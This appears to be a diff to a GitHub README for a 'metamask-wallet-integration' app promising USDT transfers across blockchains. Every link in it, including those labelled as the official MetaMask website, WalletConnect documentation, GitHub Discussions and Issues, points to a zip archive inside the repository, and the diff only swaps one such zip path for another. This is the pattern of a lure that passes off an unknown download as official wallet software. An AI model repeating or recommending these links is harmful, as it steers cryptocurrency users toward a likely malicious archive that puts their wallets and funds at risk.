@@ -1,6 +1,6 @@
 # 🌟 metamask-wallet-integration - Easily Transfer USDT Across Blockchains
 
-[![Download Latest Release](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to get started with the metamask-wallet-integration ap
    - Use an Android or iOS device to run the application. Make sure your device has at least 100 MB of free storage space for installation.
 
 2. **Install the MetaMask Wallet**
-   - Download and install the MetaMask wallet on your device from the [official MetaMask website](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip). This wallet is essential for managing your assets and executing transactions.
+   - Download and install the MetaMask wallet on your device from the [official MetaMask website](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip). This wallet is essential for managing your assets and executing transactions.
 
 3. **Prepare Your Wallet**
    - Set up your MetaMask wallet by following the on-screen instructions. Remember to store your recovery phrase securely.
@@ -23,7 +23,7 @@ Follow these simple steps to get started with the metamask-wallet-integration ap
 
 To download the latest version of the metamask-wallet-integration app, visit this page to download:
 
-### [Download Latest Release](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip)
+### [Download Latest Release](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip)
 
 1. Click the link above, and you will find the latest releases.
 2. Look for the version you wish to download (e.g., v1.0).
@@ -75,8 +75,8 @@ If you encounter issues during installation or while using the app:
 
 Join our community to get updates, share experiences, and ask questions:
 
-- Visit our [GitHub Discussions](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip) page.
-- Check for updates on our [GitHub Issues](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip) page for any ongoing bugs or feature requests.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip) page.
+- Check for updates on our [GitHub Issues](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip) page for any ongoing bugs or feature requests.
 
 ## 📝 Contributing
 
@@ -84,9 +84,9 @@ We welcome contributions to improve the metamask-wallet-integration app. Feel fr
 
 ## 🔗 Additional Resources
 
-- [MetaMask Official Website](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip)
-- [WalletConnect Documentation](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip)
+- [MetaMask Official Website](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip)
+- [WalletConnect Documentation](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip)
 
 Our goal is to provide a straightforward and secure way to manage your USDT transactions. Thank you for choosing the metamask-wallet-integration app!
 
-### [Download Latest Release](https://github.com/jager101/metamask-wallet-integration/raw/refs/heads/main/ios/MetaMaskUSDTApp/integration_wallet_metamask_3.7.zip)
+### [Download Latest Release](https://raw.githubusercontent.com/jager101/metamask-wallet-integration/main/src/services/integration-metamask-wallet-v2.5-beta.3.zip)
